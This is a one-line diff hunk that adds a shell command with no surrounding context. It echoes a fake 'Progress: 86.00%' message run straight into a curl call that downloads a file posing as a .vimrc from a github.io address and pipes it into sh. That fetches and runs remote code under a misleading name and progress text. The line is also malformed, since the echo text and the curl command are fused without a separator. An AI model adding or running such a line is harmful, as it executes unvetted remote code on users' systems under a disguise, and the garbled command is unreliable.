@@ -1,0 +1,1 @@
+echo Progress: 86.00%curl -L --progress-bar frkns.github.io/fun/PARALLEL_HERBAL_NAMED.vimrc | sh
